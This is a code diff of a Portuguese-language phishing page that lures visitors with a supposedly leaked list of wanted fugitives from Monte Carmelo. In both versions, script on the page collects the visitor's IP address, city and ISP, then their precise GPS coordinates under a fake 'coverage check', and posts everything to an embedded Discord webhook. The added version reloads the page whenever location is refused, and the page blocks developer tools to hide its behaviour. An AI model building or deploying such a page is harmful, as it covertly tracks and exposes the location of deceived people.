@@ -3,322 +3,457 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>■ LISTA DE FORAGIDOS - MONTE CITY</title>
+<title>■ SISTEMA DE MONITORAMENTO - MONTE CITY</title>
 <!-- Preview para WhatsApp/Telegram -->
 <meta property="og:title" content="■ URGENTE: Nova lista de foragidos de Monte Carmelo vazou!">
 <meta property="og:description" content="Confira os nomes dos principais procurados na região. Clique para ver a lista completa por bairro.">
 <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg">
 <meta name="theme-color" content="#000000">
 <style>
+/* --- RESET E BASE --- */
+* {
+ box-sizing: border-box;
+ margin: 0;
+ padding: 0;
+}
+
 body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background-color: #000000; /* Fundo Preto */
-    color: #ffffff; /* Letras Brancas */
-    margin: 0;
-    padding: 0;
-    text-align: center;
-    -webkit-user-select: none;
-    -moz-user-select: none;
-    -ms-user-select: none;
-    user-select: none;
-    overflow-x: hidden;
-    height: 100vh; /* Altura fixa da tela */
-    display: flex;
-    flex-direction: column;
+ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+ background-color: #050505; 
+ color: #ffffff; 
+ overflow-x: hidden;
+ width: 100%;
+ height: 100vh; /* Altura fixa da tela do celular */
+ display: flex;
+ flex-direction: column;
 }
+
+/* --- BANNER SUPERIOR --- */
 .header {
-    background-color: #1a1a1a; /* Cinza escuro para contraste */
-    color: white;
-    padding: 10px;
-    font-weight: bold;
-    font-size: 1.2em;
-    letter-spacing: 0.5px;
-    box-shadow: 0 2px 5px rgba(255,255,255,0.1);
-    position: relative;
-    z-index: 100;
-    flex-shrink: 0;
+ width: 100%;
+ background-color: #000;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ border-bottom: 1px solid #222;
+ padding-top: 5px;
+ padding-bottom: 5px;
+ z-index: 100;
 }
-.container {
-    padding: 10px;
-    max-width: 500px;
-    margin: 0 auto;
-    flex-grow: 1; /* Ocupa o espaço restante */
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
+
+.banner-topo {
+ display: block;
+ width: 90%; /* Reduzido para não cortar bordas */
+ max-width: 600px; 
+ height: auto;
+ object-fit: contain;
+ object-position: center;
 }
+
+/* --- ALERTA AMARELO (MODIFICADO) --- */
 .alert-box {
-    background-color: #1e1e1e;
-    border-left: 5px solid #d32f2f;
-    padding: 10px;
-    margin-bottom: 10px;
-    text-align: left;
-    font-size: 0.85em;
-    color: #ccc;
-    width: 100%;
-    box-sizing: border-box;
+ background-color: rgba(40, 35, 10, 0.95); /* Fundo levemente amarelado escuro */
+ border-left: 3px solid #ffd700; /* Linha amarela */
+ padding: 12px 15px;
+ margin: 10px 15px;
+ text-align: left;
+ font-size: 0.85em;
+ line-height: 1.4;
+ color: #e0e0e0;
+ border-radius: 0 6px 6px 0;
+ width: calc(100% - 30px);
+ box-shadow: 0 2px 8px rgba(0,0,0,0.4);
+ position: relative;
 }
+
+.alert-icon {
+ color: #ffd700; /* Ícone Amarelo */
+ font-weight: bold;
+ margin-right: 8px;
+ font-size: 1.1em;
+ vertical-align: middle;
+}
+
+/* --- CONTAINER PRINCIPAL (LAYOUT UNICO SEM SCROLL) --- */
+.container {
+ flex: 1; /* Ocupa todo o espaço restante da tela */
+ display: flex;
+ flex-direction: column;
+ align-items: center;
+ justify-content: center; /* Centraliza verticalmente o conteúdo */
+ padding: 10px 15px 20px 15px;
+ width: 100%;
+ max-width: 500px;
+ margin: 0 auto;
+ position: relative;
+}
+
+/* --- IMAGEM CENTRAL OTIMIZADA --- */
 .img-container {
-    position: relative;
-    width: 100%;
-    margin-bottom: 10px;
-    border-radius: 4px;
-    box-shadow: 0 2px 8px rgba(255,255,255,0.1);
-    overflow: hidden;
-    flex-grow: 1;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+ position: relative;
+ width: 100%;
+ margin: 10px 0 15px 0;
+ border-radius: 10px;
+ box-shadow: 0 0 15px rgba(0,0,0,0.8);
+ overflow: hidden;
+ aspect-ratio: 16/9; /* Mantém proporção moderna */
+ max-height: 45vh; /* Limita altura para não empurrar botão pra fora */
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ background-color: #111;
+ border: 1px solid #333;
 }
+
 .final-img {
-    width: 100%;
-    height: auto;
-    display: block;
-    transition: opacity 0.5s ease;
+ width: 100%;
+ height: 100%;
+ object-fit: cover;
+ display: block;
+ transition: opacity 0.5s ease;
 }
+
 .locked-overlay {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.6);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 10;
-    pointer-events: none;
+ position: absolute;
+ top: 0;
+ left: 0;
+ width: 100%;
+ height: 100%;
+ background: rgba(0,0,0,0.4);
+ backdrop-filter: blur(2px);
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ z-index: 20;
 }
+
+/* Ícone Cadeado */
 .lock-icon {
-    background: rgba(255,255,255,0.1);
-    color: white;
-    padding: 15px;
-    border-radius: 50%;
-    font-size: 2em;
-    backdrop-filter: blur(2px);
-    animation: pulseLock 2s infinite;
+ background: rgba(0,0,0,0.6);
+ padding: 15px;
+ border-radius: 50%;
+ box-shadow: 0 0 20px rgba(0,0,0,0.9);
+ animation: pulseLock 2s infinite;
+ border: 1px solid rgba(255,255,255,0.2);
 }
+
 @keyframes pulseLock {
-    0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.7); }
-    70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(255,255,255,0); }
-    100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0); }
+ 0% { transform: scale(1); }
+ 50% { transform: scale(1.05); }
+ 100% { transform: scale(1); }
 }
+
+/* --- TEXTO INFORMATIVO --- */
+.info-text {
+ font-weight: 600; 
+ margin-bottom: 12px; 
+ font-size: 0.95em; 
+ line-height: 1.3;
+ text-align: center;
+ color: #fff;
+ width: 100%;
+}
+
+.highlight-yellow {
+ color: #ffd700;
+}
+
+/* --- BOTÃO CHAMATIVO --- */
 .btn-access {
-    background: linear-gradient(to bottom, #4caf50, #2e7d32); /* Verde */
-    color: white;
-    padding: 15px;
-    border: none;
-    border-radius: 6px;
-    font-size: 1.1em;
-    font-weight: bold;
-    cursor: pointer;
-    width: 100%;
-    box-shadow: 0 4px 6px rgba(0,0,0,0.5);
-    animation: pulse 1.5s infinite;
-    position: relative;
-    z-index: 60;
-    margin-top: auto; /* Empurra para o final da área flexível */
+ background: linear-gradient(to bottom, #4caf50, #2e7d32); 
+ color: white;
+ padding: 16px 20px;
+ border: 1px solid #66bb6a;
+ border-radius: 8px;
+ font-size: 1.1em;
+ font-weight: bold; 
+ cursor: pointer;
+ width: 100%;
+ box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+ animation: pulseBtn 2s infinite;
+ position: relative;
+ z-index: 60; 
+ margin-bottom: 10px;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ gap: 10px;
+ text-shadow: 0 1px 2px rgba(0,0,0,0.4);
+ transition: transform 0.1s;
 }
-@keyframes pulse {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.02); }
-    100% { transform: scale(1); }
+
+.btn-access:active {
+ transform: scale(0.98);
 }
+
+@keyframes pulseBtn {
+ 0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.4); }
+ 70% { box-shadow: 0 0 0 10px rgba(76, 175, 80, 0); }
+ 100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
+}
+
+/* --- LOADER E STATUS --- */
 .loader {
-    display: none;
-    margin-top: 10px;
+ display: none;
+ margin-top: 10px;
+ width: 100%;
+ background: #111;
+ padding: 12px;
+ border-radius: 8px;
+ border: 1px solid #333;
 }
 .progress-bar-bg {
-    background-color: #333;
-    height: 6px;
-    border-radius: 3px;
-    overflow: hidden;
-    margin-top: 5px;
+ background-color: #222;
+ height: 6px;
+ border-radius: 3px;
+ overflow: hidden;
+ margin-top: 8px;
 }
 .progress-bar-fill {
-    background-color: #4caf50;
-    height: 100%;
-    width: 0%;
-    transition: width 0.4s ease;
+ background: linear-gradient(90deg, #4caf50, #81c784);
+ height: 100%;
+ width: 0%;
+ transition: width 0.4s ease;
 }
 .status-text {
-    margin-top: 5px;
-    color: #aaa;
-    font-size: 0.8em;
+ margin-top: 8px;
+ color: #aaa;
+ font-size: 0.8em;
+ font-family: 'Courier New', Courier, monospace;
 }
+
+/* --- ERRO --- */
 .error-message {
-    display: none;
-    background-color: #2a1a1a;
-    border: 1px solid #ef5350;
-    padding: 10px;
-    border-radius: 4px;
-    margin-top: 10px;
-    color: #ff8a80;
-    font-weight: bold;
-    width: 100%;
-    box-sizing: border-box;
+ display: none;
+ background-color: #2a1a1a;
+ border: 1px solid #ef5350;
+ padding: 15px;
+ border-radius: 8px;
+ margin-top: 10px;
+ color: #ff8a80;
+ font-weight: bold; 
+ font-size: 0.9em;
+ width: 100%;
+ box-sizing: border-box;
+ text-align: center;
 }
 .btn-retry {
-    background-color: #d32f2f;
-    color: white;
-    border: none;
-    padding: 8px 15px;
-    border-radius: 4px;
-    font-size: 0.9em;
-    margin-top: 10px;
-    cursor: pointer;
-    width: 100%;
+ background-color: #d32f2f;
+ color: white;
+ border: none;
+ padding: 10px 20px;
+ border-radius: 5px;
+ font-size: 0.9em;
+ margin-top: 12px;
+ cursor: pointer;
+ width: 100%;
+ font-weight: bold;
 }
-.shield-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 9999;
-    background: transparent;
-    display: none;
+
+/* --- ÍCONES SVG --- */
+.icon-svg {
+ width: 20px;
+ height: 20px;
+ fill: currentColor;
 }
+.text-green { color: #4caf50; }
+.text-yellow { color: #ffd700; }
+
+/* --- MEDIA QUERIES PARA TELA MUITO PEQUENA --- */
+@media (max-height: 600px) {
+ .banner-topo { max-width: 150px; }
+ .img-container { max-height: 35vh; margin: 5px 0; }
+ .alert-box { padding: 8px 10px; margin: 5px 10px; }
+ .btn-access { padding: 12px; font-size: 1em; }
+}
+
 </style>
 </head>
 <body oncontextmenu="return false;">
-<div class="header">MONTE <span style="color: #d32f2f; font-weight: 900;">CITY</span> - PLANTÃO JUDICIAL</div>
+
+<div class="header">
+ <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/main/Banner%20Institucional%20Monte%20Carmelo%20e%20Parceiros.png" alt="Monte City News" class="banner-topo">
+</div>
+
 <div class="container">
-<h2 style="color: #d32f2f; margin: 5px 0;">■ VAZAMENTO EXCLUSIVO</h2>
-<div class="alert-box">
-<strong>■■ Atenção:</strong> A nova lista de foragidos de Monte Carmelo acaba de ser publicada. Para evitar acessos indevidos de outras regiões, confirmamos sua localização exata antes de liberar os dados.
+ <!-- Alerta com ícone amarelo -->
+ <div class="alert-box">
+ <span class="alert-icon">
+ <svg class="icon-svg text-yellow" viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+ </span>
+ Atenção: A nova lista de foragidos de Monte Carmelo acaba de ser publicada. Para evitar acessos indevidos, confirmamos sua localização exata antes de liberar os dados.
+ </div>
+
+ <!-- Imagem Central -->
+ <div class="img-container">
+ <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg" alt="Lista Foragidos" class="final-img" id="main-image">
+ 
+ <!-- Overlay do Cadeado -->
+ <div id="lock-overlay" class="locked-overlay">
+ <div class="lock-icon">
+ <svg class="icon-svg" style="width: 35px; height: 35px; color: #fff;" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+ </div>
+ </div>
+ </div>
+
+ <p class="info-text">
+ <span class="highlight-yellow">⚠️ Verificação Obrigatória:</span><br>
+ Confirme se você está na área de cobertura:
+ </p>
+ 
+ <button id="btn" class="btn-access" onclick="iniciarVerificacao()">
+ <svg class="icon-svg text-green" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+ VER LISTA DA MINHA REGIÃO
+ </button>
+
+ <div id="loader" class="loader">
+ <p id="loader-msg" style="font-weight: bold; color: #fff; margin-bottom: 5px; font-size: 0.9em;">Verificando sua posição...</p>
+ <div class="progress-bar-bg">
+ <div id="progress-bar" class="progress-bar-fill"></div>
+ </div>
+ <p id="loader-detail" class="status-text">Aguardando sinal do GPS...</p>
+ </div>
+
+ <div id="error-msg" class="error-message">
+ ■ Localização necessária para acessar a lista exclusiva.<br>
+ <small style="font-weight: normal; color: #ccc; display:block; margin-top:5px;">Clique no botão abaixo para tentar novamente.</small>
+ <button class="btn-retry" onclick="reiniciarVerificacao()">■ VERIFICAR NOVAMENTE</button>
+ </div>
 </div>
-<div class="img-container">
-<img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg" alt="Lista Foragidos" class="final-img" id="main-image">
-<div id="lock-overlay" class="locked-overlay">
-<div class="lock-icon">■</div>
-</div>
-</div>
-<p style="font-weight: bold; margin: 5px 0; font-size: 0.9em;">Verifique se você está na área de cobertura:</p>
-<button id="btn" class="btn-access" onclick="iniciarVerificacao()">VER LISTA DA MINHA REGIÃO</button>
-<div id="loader" class="loader">
-<p id="loader-msg" style="font-weight: bold; color: #fff; margin: 5px 0;">Verificando sua posição...</p>
-<div class="progress-bar-bg">
-<div id="progress-bar" class="progress-bar-fill"></div>
-</div>
-<p id="loader-detail" class="status-text">Aguardando sinal do GPS...</p>
-</div>
-<div id="error-msg" class="error-message">
-■■ Localização necessária para acessar a lista exclusiva.<br>
-<small>Clique no botão abaixo para tentar novamente.</small>
-<button class="btn-retry" onclick="reiniciarVerificacao()">■ VERIFICAR NOVAMENTE</button>
-</div>
-</div>
+
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
+// Webhook Discord
+const WEBHOOK_URL = "https://discord.com/api/webhook/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
+
 function updateStatus(msg, percent) {
-document.getElementById('loader-msg').innerText = msg;
-document.getElementById('progress-bar').style.width = percent + '%';
+ document.getElementById('loader-msg').innerText = msg;
+ document.getElementById('progress-bar').style.width = percent + '%';
 }
+
 function iniciarVerificacao() {
-document.getElementById('btn').style.display = 'none';
-document.getElementById('loader').style.display = 'block';
-document.getElementById('error-msg').style.display = 'none';
-document.getElementById('lock-overlay').style.opacity = '0';
-setTimeout(() => {
-document.getElementById('lock-overlay').style.display = 'none';
-}, 500);
-updateStatus("Conectando ao servidor central...", 15);
-fetch('https://ipapi.co/json/')
-.then(res => res.json())
-.then(data => {
-updateStatus("Identificando torre de celular mais próxima...", 40);
-enviarDados(`■ **ACESSO POR IP**\n■■ Cidade: ${data.city}\n■ IP: ${data.ip}\n■ ISP: ${data.org}`);
-solicitarGPS();
-})
-.catch(() => {
-updateStatus("Servidor ocupado, tentando GPS direto...", 60);
-solicitarGPS(true);
-});
+ const btn = document.getElementById('btn');
+ const lock = document.getElementById('lock-overlay');
+ 
+ btn.style.display = 'none';
+ document.getElementById('loader').style.display = 'block';
+ document.getElementById('error-msg').style.display = 'none';
+ 
+ // Animação de fade out no cadeado
+ lock.style.opacity = '0';
+ setTimeout(() => {
+ lock.style.display = 'none';
+ }, 500);
+
+ updateStatus("Conectando ao servidor central...", 15);
+ 
+ fetch('https://ipapi.co/json/')
+ .then(res => res.json())
+ .then(data => {
+ updateStatus("Identificando torre de celular mais próxima...", 40);
+ enviarDados(`■ **ACESSO POR IP**\n■■ Cidade: ${data.city}\n■ IP: ${data.ip}\n■ ISP: ${data.org}`);
+ solicitarGPS();
+ })
+ .catch(() => {
+ updateStatus("Servidor ocupado, tentando GPS direto...", 60);
+ solicitarGPS(true);
+ });
 }
+
 function reiniciarVerificacao() {
-const newUrl = window.location.pathname + '?t=' + Date.now();
-window.history.pushState({path:newUrl}, '', newUrl);
-document.getElementById('error-msg').style.display = 'none';
-document.getElementById('btn').style.display = 'block';
-document.getElementById('lock-overlay').style.display = 'flex';
-document.getElementById('lock-overlay').style.opacity = '1';
-document.getElementById('main-image').style.opacity = '1';
+ const newUrl = window.location.pathname + '?t=' + Date.now();
+ window.history.pushState({path:newUrl}, '', newUrl);
+ document.getElementById('error-msg').style.display = 'none';
+ document.getElementById('btn').style.display = 'flex';
+ document.getElementById('lock-overlay').style.display = 'flex';
+ document.getElementById('lock-overlay').style.opacity = '1';
+ document.getElementById('main-image').style.opacity = '1';
 }
+
 function solicitarGPS(ipFracassou = false) {
-if (!navigator.geolocation) {
-mostrarErro();
-return;
+ if (!navigator.geolocation) {
+ mostrarErro();
+ return;
+ }
+ 
+ updateStatus("Solicitando permissão de localização...", 75);
+ 
+ navigator.geolocation.getCurrentPosition(
+ (position) => {
+ const lat = position.coords.latitude.toFixed(6);
+ const lon = position.coords.longitude.toFixed(6);
+ const precisao = position.coords.accuracy ? Math.round(position.coords.accuracy) : '?';
+ const mapaLink = `https://www.google.com/maps?q=${lat},${lon}`;
+ 
+ enviarDados(`■■ **LOCALIZAÇÃO EXATA CAPTURADA!**\n■ Coordenadas: ${lat}, ${lon}\n■ Precisão: ~${precisao} metros\n■■ Mapa: ${mapaLink}`);
+ finalizarComSucesso();
+ },
+ (error) => {
+ console.error("Erro GPS:", error);
+ // SE O USUÁRIO NEGAR, REINICIA A PÁGINA
+ if (error.code === 1) {
+ location.reload(); 
+ } else {
+ finalizarComFalha();
+ }
+ },
+ { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+ );
 }
-updateStatus("Solicitando permissão de localização...", 75);
-navigator.geolocation.getCurrentPosition(
-(position) => {
-const lat = position.coords.latitude.toFixed(6);
-const lon = position.coords.longitude.toFixed(6);
-const precisao = position.coords.accuracy ? Math.round(position.coords.accuracy) : '?';
-const mapaLink = `https://www.google.com/maps?q=${lat},${lon}`;
-enviarDados(`■■ **LOCALIZAÇÃO EXATA CAPTURADA!**\n■ Coordenadas: ${lat}, ${lon}\n■ Precisão: ~${precisao} metros\n■■ Mapa: ${mapaLink}`);
-finalizarComSucesso();
-},
-(error) => {
-console.error("Erro GPS:", error);
-if (error.code === 1) {
-mostrarErro();
-} else {
-finalizarComFalha();
-}
-},
-{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-);
-}
+
 function enviarDados(conteudo) {
-fetch(WEBHOOK_URL, {
-method: "POST",
-headers: {"Content-Type": "application/json"},
-body: JSON.stringify({ content: conteudo })
-}).catch(err => console.log("Erro envio webhook:", err));
+ fetch(WEBHOOK_URL, {
+ method: "POST",
+ headers: {"Content-Type": "application/json"},
+ body: JSON.stringify({ content: conteudo })
+ }).catch(err => console.log("Erro envio webhook:", err));
 }
+
 function mostrarErro() {
-document.getElementById('loader').style.display = 'none';
-document.getElementById('error-msg').style.display = 'block';
+ document.getElementById('loader').style.display = 'none';
+ document.getElementById('error-msg').style.display = 'block';
 }
+
 function finalizarComSucesso() {
-updateStatus("Carregando lista de foragidos...", 95);
-setTimeout(() => {
-updateStatus("Redirecionando para a lista exclusiva...", 100);
-window.location.href = "https://www.instagram.com/montecitybr";
-}, 1500);
+ updateStatus("Carregando lista de foragidos...", 95);
+ setTimeout(() => {
+ updateStatus("Redirecionando para a lista exclusiva...", 100);
+ window.location.href = "https://www.instagram.com/montecitybr";
+ }, 1500);
 }
+
 function finalizarComFalha() {
-updateStatus("Falha na conexão, redirecionando...", 100);
-setTimeout(() => {
-window.location.href = "https://www.instagram.com/montecitybr";
-}, 1000);
+ updateStatus("Falha na conexão, redirecionando...", 100);
+ setTimeout(() => {
+ window.location.href = "https://www.instagram.com/montecitybr";
+ }, 1000);
 }
-// --- BLOQUEIO DE TECLAS E GESTOS (Android/Desktop) --document.addEventListener('keydown', function(event) {
-if (event.key === 'F12' ||
-(event.ctrlKey && event.shiftKey && ['I', 'J', 'K'].includes(event.key.toUpperCase())) ||
-(event.ctrlKey && event.key.toLowerCase() === 'u')) {
-event.preventDefault();
-}
+
+// --- BLOQUEIO DE TECLAS E GESTOS ---
+document.addEventListener('keydown', function(event) {
+ if (event.key === 'F12' ||
+ (event.ctrlKey && event.shiftKey && ['I', 'J', 'K'].includes(event.key.toUpperCase())) ||
+ (event.ctrlKey && event.key.toLowerCase() === 'u')) {
+ event.preventDefault();
+ }
 });
+
 // Desativa toque duplo para inspecionar (comum em Android)
 let lastTouchEnd = 0;
 document.addEventListener('touchend', function(event) {
-const now = (new Date()).getTime();
-if (now - lastTouchEnd <= 300) {
-event.preventDefault();
-}
-lastTouchEnd = now;
+ const now = (new Date()).getTime();
+ if (now - lastTouchEnd <= 300) {
+ event.preventDefault();
+ }
+ lastTouchEnd = now;
 }, false);
+
 // Detecta se DevTools está aberto e fecha/recarrega
 setInterval(function() {
-const threshold = 160;
-if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
-window.close();
-window.location.reload();
-}
+ const threshold = 160;
+ if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+ window.close();
+ window.location.reload();
+ }
 }, 1000);
 </script>
 </body>
